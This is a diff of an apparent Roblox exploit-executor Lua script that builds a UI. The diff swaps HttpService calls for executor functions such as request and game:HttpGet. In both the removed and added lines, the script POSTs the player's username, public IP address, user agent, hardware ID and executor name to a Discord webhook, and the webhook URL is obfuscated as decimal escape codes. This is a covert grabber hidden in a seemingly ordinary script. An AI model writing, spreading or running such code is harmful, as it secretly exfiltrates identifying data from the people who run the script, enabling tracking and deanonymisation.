@@ -8,9 +8,8 @@ local Mouse = LP:GetMouse()
 local MouseMovement = Enum.UserInputType.MouseMovement
 local MouseButton1 = Enum.UserInputType.MouseButton1
 local Touch = Enum.UserInputType.Touch
-HS.HttpEnabled = true
 function GetJson(v)
-    return HS:JSONDecode(HS:GetAsync(v))
+    return HS:JSONDecode(game:HttpGet(v))
 end
 function GetIP()
     local IP = GetJson("https://searchplugin.csdn.net/api/v1/ip/get").data.ip
@@ -45,39 +44,43 @@ else
             end
         end
     end)
-    HS:PostAsync("\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\50\51\48\52\49\51\48\55\49\50\48\54\53\56\48\50\53\53\47\69\95\55\101\48\111\73\89\54\111\102\83\81\84\87\98\103\121\55\56\90\68\75\119\83\87\53\53\118\118\86\82\75\75\69\48\108\55\106\114\66\72\83\76\108\119\81\97\119\45\66\73\57\69\65\112\78\85\120\98\113\100\114\53\56\49\104\76", HS:JSONEncode({
-        embeds = {
-            {
-                color = 65280,
-                fields = {
-                    {
-                        name = "Game",
-                        value = "["..game.MarketplaceService:GetProductInfo(game.PlaceId).Name.."](https://www.roblox.com/games/"..game.PlaceId..")"
-                    },
-                    {
-                        name = "User",
-                        value = "["..LP.Name.."](https://www.roblox.com/users/"..LP.UserId..")"
-                    },
-                    {
-                        name = "IP",
-                        value = GetIP()
-                    },
-                    {
-                        name = "UA",
-                        value = HS:GetUserAgent()
-                    },
-                    {
-                        name = "Hwid",
-                        value = gethwid()
-                    },
-                    {
-                        name = "Executor",
-                        value = identifyexecutor()
+    request({
+        Url = "\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\50\51\48\52\49\51\48\55\49\50\48\54\53\56\48\50\53\53\47\69\95\55\101\48\111\73\89\54\111\102\83\81\84\87\98\103\121\55\56\90\68\75\119\83\87\53\53\118\118\86\82\75\75\69\48\108\55\106\114\66\72\83\76\108\119\81\97\119\45\66\73\57\69\65\112\78\85\120\98\113\100\114\53\56\49\104\76",
+        Method = "POST",
+        Body = HS:JSONEncode({
+            embeds = {
+                {
+                    color = 65280,
+                    fields = {
+                        {
+                            name = "Game",
+                            value = "["..game.MarketplaceService:GetProductInfo(game.PlaceId).Name.."](https://www.roblox.com/games/"..game.PlaceId..")"
+                        },
+                        {
+                            name = "User",
+                            value = "["..LP.Name.."](https://www.roblox.com/users/"..LP.UserId..")"
+                        },
+                        {
+                            name = "IP",
+                            value = GetIP()
+                        },
+                        {
+                            name = "UA",
+                            value = HS:GetUserAgent()
+                        },
+                        {
+                            name = "Hwid",
+                            value = gethwid()
+                        },
+                        {
+                            name = "Executor",
+                            value = identifyexecutor()
+                        }
                     }
                 }
             }
-        }
-    }))
+        })
+    })
 end
 
 local UI = Instance.new("ScreenGui")
